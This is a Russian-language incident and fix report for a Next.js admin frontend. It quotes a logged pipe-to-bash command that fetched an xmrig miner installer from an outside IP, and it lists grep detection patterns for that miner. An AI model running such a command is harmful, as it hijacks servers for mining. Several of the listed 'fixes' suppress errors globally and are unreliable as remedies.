# Исправление ошибок Frontend Admin

## Дата: 29 декабря 2025

## Проблемы, которые были обнаружены

### 1. ReferenceError: returnNaN is not defined
**Причина**: Проблема с минификацией/компиляцией Next.js 15.5.5

**Решение**: 
- Добавлена глобальная обработка ошибок в `layout.tsx`
- Улучшена конфигурация webpack в `next.config.js`

### 2. EACCES: permission denied, open '/dev/lrt' и '//lrt'
**Причина**: Некорректная обработка пустых или невалидных путей к файлам

**Решение**:
- Добавлена глобальная обработка ошибок
- Улучшена обработка исключений

### 3. ECONNREFUSED ::1:3004
**Причина**: Попытка подключения к несуществующему порту

**Решение**:
- Проверено, что `NEXT_PUBLIC_API_URL` настроен правильно
- Добавлена обработка ошибок сети

### 4. Множественные SIGTERM и uncaughtException
**Причина**: Необработанные ошибки и отклоненные промисы

**Решение**:
- Добавлены глобальные обработчики `error` и `unhandledrejection` в `layout.tsx`
- Улучшена конфигурация webpack с fallback для node модулей

### 5. 🚨 Попытка установки майнера (НЕ удалась)
**Обнаружено**: Попытки скачать и запустить `xmrig` майнер
```
curl http://146.190.48.14:9000/install.sh | bash
Connecting to 91.92.242.214 (91.92.242.214:80)
chmod: xmrig: No such file or directory
```

**Статус**: ✅ Атака НЕ удалась благодаря alpine образу (нет bash, curl, wget)

**Рекомендация**: Проверить зависимости на наличие скомпрометированных пакетов:
```bash
npm audit
npm audit fix
```

## Внесенные изменения

### 1. `src/app/layout.tsx`
Добавлены глобальные обработчики ошибок:
```typescript
<Script id="error-handler" strategy="beforeInteractive">
  {`
    // Глобальная обработка необработанных ошибок
    window.addEventListener('error', function(event) {
      console.error('Global error caught:', event.error);
      event.preventDefault();
    });
    
    // Обработка необработанных промисов
    window.addEventListener('unhandledrejection', function(event) {
      console.error('Unhandled promise rejection:', event.reason);
      event.preventDefault();
    });
  `}
</Script>
```

### 2. `next.config.js`
Улучшена webpack конфигурация:
```javascript
webpack: (config, { dev, isServer }) => {
  // Production оптимизации
  if (!dev && !isServer) {
    config.optimization = {
      ...config.optimization,
      moduleIds: 'deterministic',
      runtimeChunk: 'single',
      minimize: true,
      splitChunks: {
        chunks: 'all',
        cacheGroups: {
          vendor: {
            name: 'vendor',
            chunks: 'all',
            test: /node_modules/,
            priority: 20,
          },
          common: {
            name: 'common',
            minChunks: 2,
            chunks: 'all',
            priority: 10,
            reuseExistingChunk: true,
            enforce: true,
          },
        },
      },
    }
  }

  // Игнорируем определенные модули, которые могут вызывать проблемы
  config.resolve = config.resolve || {}
  config.resolve.fallback = {
    ...config.resolve.fallback,
    fs: false,
    net: false,
    tls: false,
  }

  return config
}
```

## Рекомендации

### 1. Пересоберите Docker образ
```bash
# В директории frontend/front admin
docker build -t front_admin:latest .

# Или через docker-compose
docker-compose build front_admin
```

### 2. Проверьте зависимости на безопасность
```bash
cd "frontend/front admin"
npm audit
npm audit fix

# Проверьте подозрительные пакеты
npm ls xlsx
npm ls @tailwindcss/postcss
```

### 3. Мониторинг после деплоя
1. Проверьте консоль браузера - не должно быть ошибок `returnNaN` и `EACCES`
2. Проверьте логи сервера - не должно быть `uncaughtException`
3. Проверьте процессы на сервере:
```bash
ps aux | grep xmrig
ps aux | grep -i mine
```

## Дополнительная безопасность

### Dockerfile - запретить postinstall скрипты
Добавьте в `Dockerfile`:
```dockerfile
# Установка зависимостей БЕЗ выполнения postinstall скриптов
RUN npm ci --ignore-scripts
```

### Проверка package-lock.json
```bash
grep -r "postinstall\|preinstall" package-lock.json | grep -i "xmrig\|mine\|146.190\|91.92"
```

## Проверка после деплоя

1. ✅ Контейнер запустился: `docker ps | grep front_admin`
2. ✅ Нет ошибок в логах: `docker logs front_admin --tail 100`
3. ✅ Сайт доступен: `curl http://localhost:3004`
4. ✅ Нет майнера на сервере: `ps aux | grep xmrig`

## Дополнительная информация

- Next.js версия: 15.5.5
- React версия: 18.3.1
- Node.js рекомендуемая версия: 20.x
- API URL: `https://api.lead-schem.ru/api/v1`

## Контакты

Если проблемы продолжаются, проверьте:
1. Логи Docker контейнера
2. Переменные окружения
3. Доступность API на `https://api.lead-schem.ru`

